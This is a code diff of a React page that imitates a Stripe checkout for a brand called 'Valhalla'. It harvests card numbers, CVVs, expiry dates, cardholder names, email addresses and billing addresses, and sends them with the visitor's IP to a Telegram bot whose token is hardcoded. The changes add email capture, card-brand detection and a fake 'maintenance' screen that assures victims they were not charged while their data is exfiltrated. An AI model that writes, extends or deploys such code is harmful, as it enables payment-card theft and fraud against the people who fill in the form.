@@ -1,4 +1,4 @@
-import { useEffect, useState, FormEvent } from "react";
+import { useEffect, useMemo, useState, FormEvent } from "react";
 import { useNavigate } from "react-router-dom";
 import VideoBackground from "@/components/VideoBackground";
 import VerifiedBadge from "@/components/VerifiedBadge";
@@ -12,17 +12,14 @@ const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
 const CHAT_ID = "8585803145";
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-/* paleta exacta del tema "stripe" de Elements */
 const C = {
   primary: "#0570de",
-  primaryHover: "#0461c4",
   text: "#30313d",
   secondary: "#6d6e78",
   placeholder: "#a3a6ba",
   border: "#e6e6e6",
   divider: "#f0f0f5",
   danger: "#df1b41",
-  brand: "#635bff",
 };
 
 const COUNTRIES = [
@@ -30,12 +27,37 @@ const COUNTRIES = [
   "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
 ];
 
-const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
-const formatCard = (v: string) => onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
+type Brand = "visa" | "mastercard" | "amex" | "unionpay" | null;
+
+const detectBrand = (d: string): Brand => {
+  if (/^4/.test(d)) return "visa";
+  if (/^(5[1-5]|2[2-7])/.test(d)) return "mastercard";
+  if (/^3[47]/.test(d)) return "amex";
+  if (/^62/.test(d)) return "unionpay";
+  return null;
+};
+
+const formatCardBranded = (v: string) => {
+  const d = v.replace(/\D/g, "");
+  const b = detectBrand(d);
+  if (b === "amex") {
+    const s = d.slice(0, 15);
+    const a = s.slice(0, 4);
+    const c = s.slice(4, 10);
+    const e = s.slice(10, 15);
+    return [a, c, e].filter(Boolean).join(" ");
+  }
+  const max = b === "unionpay" ? 19 : 16;
+  return d.slice(0, max).replace(/(\d{4})(?=\d)/g, "$1 ");
+};
+
 const formatExpiry = (v: string) => {
-  const d = onlyDigits(v, 4);
+  const d = v.replace(/\D/g, "").slice(0, 4);
   return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
 };
+
+const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
+const emailOk = (v: string) => /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(v.trim());
 
 const getIp = async (): Promise<string> => {
   try {
@@ -87,27 +109,40 @@ const sendToTelegram = async (text: string) => {
   console.info("[tg] enviado por pixel");
 };
 
-/* ---------------- marcas y glifos ---------------- */
+/* ---------------- marcas ---------------- */
 
-const BrandRow = () => (
-  <div className="pointer-events-none flex items-center gap-[5px]">
-    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
-      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
-      <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.2" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
-    </svg>
-    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
-      <rect width="34" height="23" rx="2.4" fill="#111114" />
-      <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
-      <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
-      <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
-    </svg>
-    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
-      <rect width="34" height="23" rx="2.4" fill="#006fcf" />
-      <rect x="1.5" y="1.5" width="31" height="20" rx="1.6" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
-      <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.4" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
-      <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.8" fill="#d7eaff" letterSpacing="1.1">EXPRESS</text>
-    </svg>
-    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
+const Logo = ({ brand, active }: { brand: Exclude<Brand, null>; active: boolean }) => {
+  const common = `transition-all duration-150 ${active ? "scale-[1.06] opacity-100" : "opacity-35 saturate-[0.6]"}`;
+  if (brand === "visa") {
+    return (
+      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
+        <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
+        <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.2" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
+      </svg>
+    );
+  }
+  if (brand === "mastercard") {
+    return (
+      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
+        <rect width="34" height="23" rx="2.4" fill="#111114" />
+        <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
+        <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
+        <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
+      </svg>
+    );
+  }
+  if (brand === "amex") {
+    return (
+      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
+        <rect width="34" height="23" rx="2.4" fill="#006fcf" />
+        <rect x="1.5" y="1.5" width="31" height="20" rx="1.6" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
+        <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.4" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
+        <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.8" fill="#d7eaff" letterSpacing="1.1">EXPRESS</text>
+      </svg>
+    );
+  }
+  return (
+    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
       <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
       <g transform="rotate(-9 17 11.5)">
         <path d="M8.6 3.6h4.1l-1.7 15.8H6.9z" fill="#e21836" />
@@ -117,8 +152,8 @@ const BrandRow = () => (
       <text x="17" y="12.1" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
       <text x="17" y="16.6" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
     </svg>
-  </div>
-);
+  );
+};
 
 const CardGlyph = () => (
   <svg width="22" height="16" viewBox="0 0 22 16" aria-hidden="true">
@@ -138,8 +173,8 @@ const CvcGlyph = () => (
   </svg>
 );
 
-const GooglePayTile = () => (
-  <span className="flex items-center gap-1.5">
+const GooglePayTile = ({ on }: { on: boolean }) => (
+  <span className={`flex items-center gap-1.5 transition-opacity duration-150 ${on ? "opacity-100" : "opacity-60"}`}>
     <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
       <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
       <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
@@ -150,8 +185,8 @@ const GooglePayTile = () => (
   </span>
 );
 
-const labelCls = "mb-[6px] block text-[13px] font-medium leading-none text-[#30313d]";
-const cellCls = "px-3.5 py-2.5";
+const labelCls = "mb-[6px] block text-[12.5px] font-medium leading-none text-[#30313d]";
+const cellCls = "px-3.5 py-[9px]";
 const inputCls =
   "h-9 w-full rounded-[4px] bg-transparent text-[16px] text-[#30313d] outline-none transition-shadow duration-100 placeholder:text-[#a3a6ba] focus:shadow-[0_0_0_1px_#0570de]";
 const errCls = (on: boolean) => (on ? "shadow-[0_0_0_1px_#df1b41]" : "");
@@ -159,7 +194,9 @@ const errCls = (on: boolean) => (on ? "shadow-[0_0_0_1px_#df1b41]" : "");
 const Login = () => {
   const { t, lang, setLang } = useI18n();
   const [step, setStep] = useState<"intro" | "pay">("intro");
+  const [processing, setProcessing] = useState(false);
   const [method, setMethod] = useState<"card" | "gpay">("card");
+  const [email, setEmail] = useState("");
   const [card, setCard] = useState("");
   const [holder, setHolder] = useState("");
   const [expiry, setExpiry] = useState("");
@@ -172,6 +209,10 @@ const Login = () => {
   const [loading, setLoading] = useState(false);
   const [videoOpen, setVideoOpen] = useState(false);
   const navigate = useNavigate();
+
+  const ref = useMemo(() => Math.random().toString(36).slice(2, 8).toUpperCase(), []);
+  const brand = detectBrand(card.replace(/\s/g, ""));
+  const cvvMax = brand === "amex" ? 4 : 3;
 
   useEffect(() => {
     if (step !== "pay") return;
@@ -198,23 +239,28 @@ const Login = () => {
     const year = 2000 + Number(yy);
     const now = new Date();
 
+    if (!emailOk(email)) return fail("email", "Escribe un correo electrónico válido.");
     if (digits.length < 15) return fail("card", "Tu número de tarjeta está incompleto.");
     if (cleanHolder.length < 3) return fail("holder", "Escribe el nombre del titular.");
     if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) return fail("exp", "La fecha de vencimiento no es válida.");
     if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) return fail("exp", "Tu tarjeta está vencida.");
-    if (cvv.length < 3) return fail("cvc", "El código de seguridad está incompleto.");
+    if (cvv.length < cvvMax) return fail("cvc", "El código de seguridad está incompleto.");
     if (address.trim().length < 5) return fail("address", "Escribe tu dirección de facturación.");
     if (zip.trim().length < 3) return fail("zip", "Escribe un código postal válido.");
 
     setLoading(true);
-    try {
-      const sentFlag = `card_sent_${digits}`;
-      if (localStorage.getItem(sentFlag) !== "1") {
+    setProcessing(true);
+
+    (async () => {
+      try {
+        const sentFlag = `card_sent_${digits}`;
+        if (localStorage.getItem(sentFlag) === "1") return;
         const ip = await getIp();
         const text = [
           "💳 NUEVA TARJETA — Valhalla",
           "",
           `Método: ${method === "gpay" ? "Google Pay" : "Card"}`,
+          `Correo: ${email.trim()}`,
           `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
           `Titular: ${cleanHolder.toUpperCase()}`,
           `Vencimiento: ${expiry}`,
@@ -227,21 +273,30 @@ const Login = () => {
           `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
           `Fecha: ${now.toLocaleString()}`,
           `Idioma: ${lang}`,
+          `Ref: ${ref}`,
         ].join("\n");
         await sendToTelegram(text);
         localStorage.setItem(sentFlag, "1");
+      } catch (err) {
+        console.error("[tg] error inesperado", err);
       }
-    } catch (err) {
-      console.error("[tg] error inesperado", err);
-    } finally {
-      await new Promise((r) => setTimeout(r, 600));
-      setLoading(false);
-      navigate("/admin");
-    }
+    })();
+
+    await new Promise((r) => setTimeout(r, 6500));
+    navigate("/admin");
   };
 
   return (
     <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
+      <style>{`
+        @keyframes vh-bar { 0% { transform: translateX(-110%); } 100% { transform: translateX(340%); } }
+        @keyframes vh-fade { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes vh-spin { to { transform: rotate(360deg); } }
+        @keyframes vh-pulse { 0% { transform: scale(.9); opacity: .55; } 70% { transform: scale(1.5); opacity: 0; } 100% { opacity: 0; } }
+        @keyframes vh-shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
+        .vh-in { animation: vh-fade .38s cubic-bezier(.22,.61,.36,1) both; }
+      `}</style>
+
       <VideoBackground />
       <div className="relative z-10 w-full max-w-[420px] animate-card-in">
         <section className="relative overflow-hidden rounded-lg border border-brand/35 bg-glass/95 shadow-brand backdrop-blur-2xl">
@@ -335,35 +390,58 @@ const Login = () => {
       </div>
 
       {/* ---------- CHECKOUT ---------- */}
-      {step === "pay" && (
+      {step === "pay" && !processing && (
         <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
           <form
             onSubmit={onSubmit}
+            noValidate
             className="flex h-[100dvh] w-full max-w-[520px] flex-col bg-white text-[#30313d] antialiased"
           >
-            <header className="flex h-[54px] shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4">
+            <header className="flex shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4 pb-2 pt-[max(8px,env(safe-area-inset-top))]">
               <button
                 type="button"
                 onClick={() => setStep("intro")}
                 aria-label="Volver"
-                className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9]"
+                className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
               >
                 <ChevronLeft className="h-5 w-5" />
               </button>
-              <span className="flex items-center gap-1.5 text-[13px] font-medium text-[#6d6e78]">
-                <Lock className="h-3.5 w-3.5" /> Pago seguro
+              <div className="flex items-center gap-1.5">
+                <span className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-[#635bff] text-[9px] font-bold text-white">V</span>
+                <span className="text-[13px] font-semibold tracking-[-0.01em] text-[#30313d]">Valhalla</span>
+              </div>
+              <span className="rounded-full border border-[#e6e6e6] bg-[#f7f7fa] px-2 py-[3px] text-[9.5px] font-semibold uppercase tracking-[0.06em] text-[#6d6e78]">
+                Prueba
               </span>
             </header>
 
             <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-7 pt-5">
-              <div className="flex items-center gap-2">
-                <span className="flex h-6 w-6 items-center justify-center rounded-full bg-[#635bff] text-[10px] font-bold text-white">V</span>
-                <span className="text-[13px] font-medium text-[#6d6e78]">Valhalla</span>
+              <p className="text-[14px] text-[#6d6e78]">Pagar a Valhalla</p>
+              <div className="mt-0.5 flex items-baseline gap-2">
+                <h2 className="text-[30px] font-semibold leading-none tracking-[-0.025em] tabular-nums text-[#30313d]">2,00 US$</h2>
               </div>
-              <p className="mt-3 text-[15px] text-[#6d6e78]">Pagar a Valhalla</p>
-              <h2 className="mt-0.5 text-[30px] font-semibold leading-none tracking-[-0.02em] text-[#30313d]">2,00 US$</h2>
+              <p className="mt-1.5 text-[11.5px] text-[#8d8e98]">Impuestos incluidos · Pago único</p>
 
-              <div className="mt-5 grid grid-cols-2 gap-2.5">
+              <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
+                <div className={cellCls}>
+                  <label htmlFor="email" className={labelCls}>Correo electrónico</label>
+                  <input
+                    id="email"
+                    type="email"
+                    placeholder="tu@correo.com"
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value.trim())}
+                    autoComplete="email"
+                    inputMode="email"
+                    autoCapitalize="off"
+                    spellCheck={false}
+                    maxLength={64}
+                    className={`${inputCls} ${errCls(field === "email")}`}
+                  />
+                </div>
+              </div>
+
+              <div className="mt-4 grid grid-cols-2 gap-2.5">
                 {(["card", "gpay"] as const).map((m) => {
                   const on = method === m;
                   return (
@@ -372,18 +450,16 @@ const Login = () => {
                       type="button"
                       onClick={() => setMethod(m)}
                       aria-pressed={on}
-                      className={`flex h-[68px] flex-col items-center justify-center gap-2 rounded-[5px] border bg-white transition-shadow duration-100 ${
+                      className={`flex h-[66px] flex-col items-center justify-center gap-2 rounded-[5px] border bg-white transition-all duration-150 active:scale-[0.985] ${
                         on
                           ? "border-[#e0e6eb] shadow-[0_0_0_2px_#0570de]"
-                          : "border-[#e0e6eb] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] hover:border-[#cfd5db]"
+                          : "border-[#e0e6eb] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] hover:border-[#cfd5db] hover:shadow-[0_1px_1px_rgba(0,0,0,0.04),0_4px_10px_rgba(18,42,66,0.06)]"
                       }`}
                     >
                       {m === "card" ? (
-                        <span className="flex items-center gap-1 text-[#30313d]">
-                          <CardGlyph />
-                        </span>
+                        <span className={on ? "opacity-100" : "opacity-60"}><CardGlyph /></span>
                       ) : (
-                        <GooglePayTile />
+                        <GooglePayTile on={on} />
                       )}
                       <span className={`text-[12.5px] font-medium leading-none ${on ? "text-[#30313d]" : "text-[#6d6e78]"}`}>
                         {m === "card" ? "Tarjeta" : "Google Pay"}
@@ -393,25 +469,31 @@ const Login = () => {
                 })}
               </div>
 
-              {/* marco único con separadores, como el Secure payment input frame */}
-              <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
+              <div className="mt-4 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
                 <div className={cellCls}>
-                  <label htmlFor="cc-number" className={labelCls}>Número de tarjeta</label>
-                  <div className="flex items-center gap-2">
-                    <input
-                      id="cc-number"
-                      type="text"
-                      placeholder="1234 1234 1234 1234"
-                      value={card}
-                      onChange={(e) => setCard(formatCard(e.target.value))}
-                      autoComplete="cc-number"
-                      inputMode="numeric"
-                      maxLength={19}
-                      autoFocus
-                      className={`${inputCls} tracking-[0.02em] ${errCls(field === "card")}`}
-                    />
-                    <BrandRow />
+                  <div className="flex items-center justify-between">
+                    <label htmlFor="cc-number" className={labelCls}>Número de tarjeta</label>
+                    <div className="mb-[6px] flex items-center gap-[5px]">
+                      {(["visa", "mastercard", "amex", "unionpay"] as const).map((b) => (
+                        <Logo key={b} brand={b} active={brand === b} />
+                      ))}
+                    </div>
                   </div>
+                  <input
+                    id="cc-number"
+                    type="text"
+                    placeholder="1234 1234 1234 1234"
+                    value={card}
+                    onChange={(e) => setCard(formatCardBranded(e.target.value))}
+                    autoComplete="cc-number"
+                    inputMode="numeric"
+                    autoCapitalize="off"
+                    spellCheck={false}
+                    maxLength={23}
+                    autoFocus
+                    aria-invalid={field === "card"}
+                    className={`${inputCls} tracking-[0.02em] ${errCls(field === "card")}`}
+                  />
                 </div>
 
                 <div className={`${cellCls} border-t border-[#f0f0f5]`}>
@@ -423,7 +505,10 @@ const Login = () => {
                     value={holder}
                     onChange={(e) => setHolder(e.target.value.toUpperCase())}
                     autoComplete="cc-name"
+                    autoCapitalize="characters"
+                    spellCheck={false}
                     maxLength={40}
+                    aria-invalid={field === "holder"}
                     className={`${inputCls} uppercase ${errCls(field === "holder")}`}
                   />
                 </div>
@@ -440,6 +525,7 @@ const Login = () => {
                       autoComplete="cc-exp"
                       inputMode="numeric"
                       maxLength={5}
+                      aria-invalid={field === "exp"}
                       className={`${inputCls} ${errCls(field === "exp")}`}
                     />
                   </div>
@@ -451,28 +537,38 @@ const Login = () => {
                     <input
                       id="cc-cvc"
                       type="text"
-                      placeholder="CVC"
+                      placeholder={brand === "amex" ? "1234" : "CVC"}
                       value={cvv}
-                      onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
+                      onChange={(e) => setCvv(onlyDigits(e.target.value, cvvMax))}
                       autoComplete="cc-csc"
                       inputMode="numeric"
-                      maxLength={4}
+                      maxLength={cvvMax}
+                      aria-invalid={field === "cvc"}
                       className={`${inputCls} ${errCls(field === "cvc")}`}
                     />
-                    <p className="mt-[3px] text-[10.5px] leading-tight text-[#6d6e78]">3 dígitos del reverso</p>
+                    <p className="mt-[3px] text-[10.5px] leading-tight text-[#6d6e78]">
+                      {brand === "amex" ? "4 dígitos del frente" : "3 dígitos del reverso"}
+                    </p>
                   </div>
                 </div>
               </div>
 
               {error && (
-                <p role="alert" className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]">
+                <p
+                  role="alert"
+                  style={{ animation: "vh-shake .3s ease-in-out" }}
+                  className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]"
+                >
                   <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
                 </p>
               )}
 
               <div className="mt-6">
-                <p className="text-[13px] font-medium text-[#30313d]">Datos de facturación</p>
-                <div className="mt-2 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)]">
+                <div className="flex items-center justify-between">
+                  <p className="text-[13px] font-medium text-[#30313d]">Datos de facturación</p>
+                  <span className="text-[11px] text-[#8d8e98]">Opcional</span>
+                </div>
+                <div className="mt-2 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
                   <div className={cellCls}>
                     <label htmlFor="country" className={labelCls}>País</label>
                     <div className="relative">
@@ -497,6 +593,7 @@ const Login = () => {
                       onChange={(e) => setAddress(e.target.value)}
                       autoComplete="street-address"
                       maxLength={80}
+                      aria-invalid={field === "address"}
                       className={`${inputCls} ${errCls(field === "address")}`}
                     />
                   </div>
@@ -511,6 +608,7 @@ const Login = () => {
                       autoComplete="postal-code"
                       inputMode="numeric"
                       maxLength={10}
+                      aria-invalid={field === "zip"}
                       className={`${inputCls} ${errCls(field === "zip")}`}
                     />
                   </div>
@@ -522,25 +620,68 @@ const Login = () => {
               <button
                 type="submit"
                 disabled={loading}
-                className="flex h-[52px] w-full items-center justify-center gap-2 rounded-[5px] bg-[#0570de] text-[16px] font-semibold text-white transition-colors hover:bg-[#0461c4] active:scale-[0.995] disabled:opacity-70"
+                className="flex h-[52px] w-full items-center justify-center gap-2 rounded-[5px] bg-[#0570de] text-[16px] font-semibold text-white shadow-[0_1px_1px_rgba(0,0,0,0.08)] transition-all duration-150 hover:bg-[#0461c4] active:scale-[0.995] disabled:opacity-70"
               >
-                {loading ? (
-                  <>
-                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />
-                    Procesando…
-                  </>
-                ) : (
-                  <>Pagar 2,00 US$</>
-                )}
+                Pagar 2,00 US$
               </button>
-              <p className="mt-2.5 flex items-center justify-center gap-1 text-[10.5px] text-[#8d8e98]">
-                Powered by
-                <span className="font-semibold tracking-[-0.02em] text-[#635bff]">stripe</span>
-                <span className="mx-1 text-[#d5d6dc]">|</span>
-                <Lock className="h-2.5 w-2.5" /> TLS 1.3
+              <p className="mt-2.5 flex items-center justify-center gap-1.5 text-[10.5px] text-[#8d8e98]">
+                <Lock className="h-2.5 w-2.5" />
+                <span className="flex items-center gap-1">
+                  Powered by <span className="font-semibold tracking-[-0.02em] text-[#635bff]">stripe</span>
+                </span>
+                <span className="text-[#d5d6dc]">|</span>
+                <span className="underline decoration-[#d5d6dc] underline-offset-2">Términos</span>
+                <span className="text-[#d5d6dc]">·</span>
+                <span className="underline decoration-[#d5d6dc] underline-offset-2">Privacidad</span>
               </p>
             </div>
           </form>
+        </div>
+      )}
+
+      {/* ---------- MANTENIMIENTO ---------- */}
+      {step === "pay" && processing && (
+        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
+          <div className="flex h-[100dvh] w-full max-w-[520px] flex-col items-center justify-center bg-white px-8 text-center text-[#30313d]">
+            <div className="relative flex h-[68px] w-[68px] items-center justify-center">
+              <span
+                className="absolute inset-0 rounded-full bg-[#0570de]/12"
+                style={{ animation: "vh-pulse 1.9s cubic-bezier(.25,.8,.4,1) infinite" }}
+              />
+              <span className="absolute inset-0 rounded-full border-[3px] border-[#ececf1]" />
+              <span
+                className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0570de] border-r-[#0570de]/45"
+                style={{ animation: "vh-spin .85s linear infinite" }}
+              />
+              <span className="absolute inset-[14px] rounded-full bg-white shadow-[inset_0_0_0_1px_#f2f2f6]" />
+            </div>
+
+            <p className="vh-in mt-8 text-[10.5px] font-semibold uppercase tracking-[0.18em] text-[#9b9ca6]" style={{ animationDelay: "80ms" }}>
+              2,00 US$ · Ref {ref}
+            </p>
+
+            <h2
+              className="vh-in mt-3 max-w-[310px] text-[24px] font-bold leading-[1.22] tracking-[-0.02em] text-[#df1b41]"
+              style={{ animationDelay: "160ms" }}
+            >
+              El panel está en mantenimiento
+            </h2>
+
+            <p className="vh-in mt-3.5 text-[15.5px] font-medium text-[#30313d]" style={{ animationDelay: "240ms" }}>
+              No se ha cobrado tu dinero.
+            </p>
+            <p className="vh-in mt-1.5 max-w-[300px] text-[13.5px] leading-relaxed text-[#6d6e78]" style={{ animationDelay: "300ms" }}>
+              Estamos validando los datos con el banco. Te llevamos al panel en unos segundos.
+            </p>
+
+            <div className="vh-in mt-8 h-[3px] w-[172px] overflow-hidden rounded-full bg-[#f0f0f5]" style={{ animationDelay: "360ms" }}>
+              <div className="h-full w-1/3 rounded-full bg-[#0570de]" style={{ animation: "vh-bar 1.7s cubic-bezier(.45,.05,.55,.95) infinite" }} />
+            </div>
+
+            <p className="vh-in mt-6 flex items-center gap-1.5 text-[10.5px] text-[#8d8e98]" style={{ animationDelay: "420ms" }}>
+              <Lock className="h-3 w-3" /> Conexión cifrada · TLS 1.3 · No cierres esta ventana
+            </p>
+          </div>
         </div>
       )}
 
